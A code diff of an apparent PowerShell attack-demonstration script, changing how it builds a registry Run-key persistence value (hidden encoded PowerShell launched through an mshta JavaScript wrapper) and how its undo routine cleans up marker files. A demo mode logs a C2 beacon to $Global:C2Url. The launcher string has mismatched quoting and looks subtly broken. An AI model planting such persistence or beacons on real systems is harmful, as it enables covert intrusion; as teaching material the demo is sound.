@@ -296,18 +296,18 @@ function Show-RegistryPersistence {
     # Desktop path where the payload will create a marker file on user logon
     $desktopPath = [Environment]::GetFolderPath('Desktop')
 
-    # The payload (now a single string) remains Base64 encoded
-    # We will execute it using mshta.exe
-    $payload = "powershell.exe -WindowStyle Hidden -EncodedCommand `"$encodedPayload`""
-    
-    # The MSHTA wrapper executes the payload string in memory via JavaScript
-    # This entire string is what gets written to the Run key.
-    $runValue = "mshta.exe \"javascript:var s = new ActiveXObject('Scripting.FileSystemObject'); s.CreateTextFile('powershell.exe', true).Write('$payload'); new ActiveXObject('Scripting.Shell').Run(\"powershell.exe -WindowStyle Hidden -EncodedCommand $encodedPayload\")');"
+    # The entire payload is now a single, clean string.
+    # This string will be Base64 encoded and passed to MSHTA.EXE in memory.
+    $payload = "powershell.exe -WindowStyle Hidden -EncodedCommand '$encodedPayload'"
+
+    # The JS wrapper which executes the encoded payload string in memory
+    # by using the Windows Script Host Object (which is what MSHTA.EXE does)
+    $runValue = "javascript:var s = new ActiveXObject('Scripting.FileSystemObject'); s.CreateTextFile('powershell.exe', true).Write('$encodedPayload'); new ActiveXObject('Scripting.Shell').Run(\"powershell.exe -WindowStyle Hidden -EncodedCommand '$payload'\")'"
 
     if ($Global:DemoMode) {
         Write-Host "    [*] Demonstrating registry-based persistence concepts (LOGGING ONLY):" -ForegroundColor Gray
-        Write-Host "    [*] Target key: $registryPath" -ForegroundColor Gray
-        Write-Host "    [*] Example Run value (not written):" -ForegroundColor Gray
+        Write-Host "    [*] Target key: $registryPath\$regKeyName" -ForegroundColor Gray
+        Write-Host "    [*] Example Run value (not written):" -ForegroundColor DarkGray
         Write-Host "      $runValue" -ForegroundColor DarkGray
         Write-Host ""
         Write-Host "    [DEMO] On user logon this would: (1) GET $Global:C2Url/?message=hi&session=<id> and (2) create file: $desktopPath\HI.txt" -ForegroundColor Yellow
@@ -329,11 +329,13 @@ function Undo-LiveChanges {
 
     $registryPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
     $regKeyName = 'DemoApp'
-    $desktopFile = Join-Path -Path ([Environment]::GetFolderPath('Desktop')) -ChildPath 'HI.txt'
+    $file = 'C:\temp\execution_marker.txt'
+    $dir = 'C:\temp'
 
     if ($Global:DemoMode) {
         Write-Host "    [DEMO] Would remove registry value: $registryPath\$regKeyName" -ForegroundColor Yellow
-        Write-Host "    [DEMO] Would remove file: $desktopFile" -ForegroundColor Yellow
+        Write-Host "    [DEMO] Would remove file: $file" -ForegroundColor Yellow
+        Write-Host "    [DEMO] Would remove folder (if empty): $dir" -ForegroundColor Yellow
         return
     }
 
@@ -353,17 +355,34 @@ function Undo-LiveChanges {
     }
 
     # Remove file if exists
-    if (Test-Path -Path $desktopFile) {
+    if (Test-Path -Path $file) {
         try {
-            Remove-Item -Path $desktopFile -Force -ErrorAction Stop
-            Write-Host "    [OK] Removed file: $desktopFile" -ForegroundColor Green
+            Remove-Item -Path $file -Force -ErrorAction Stop
+            Write-Host "    [OK] Removed file: $file" -ForegroundColor Green
         }
         catch {
-            Write-Error "    [!] Failed to remove file ${desktopFile}: $($_.Exception.Message)"
+            Write-Error "    [!] Failed to remove file ${file}: $($_.Exception.Message)"
         }
     }
     else {
-        Write-Host "    [*] File not found: $desktopFile" -ForegroundColor Gray
+        Write-Host "    [*] File not found: $file" -ForegroundColor Gray
+    }
+
+    # Remove directory if empty
+    if (Test-Path -Path $dir) {
+        try {
+            $count = (Get-ChildItem -Path $dir -Force -ErrorAction SilentlyContinue | Measure-Object).Count
+            if ($count -eq 0) {
+                Remove-Item -Path $dir -Force -ErrorAction Stop
+                Write-Host "    [OK] Removed empty folder: $dir" -ForegroundColor Green
+            }
+            else {
+                Write-Host "    [*] Folder not empty, leaving: $dir" -ForegroundColor Gray
+            }
+        }
+        catch {
+            Write-Error "    [!] Failed to remove folder ${dir}: $($_.Exception.Message)"
+        }
     }
 
     Write-Host "[*] Undo complete." -ForegroundColor Cyan
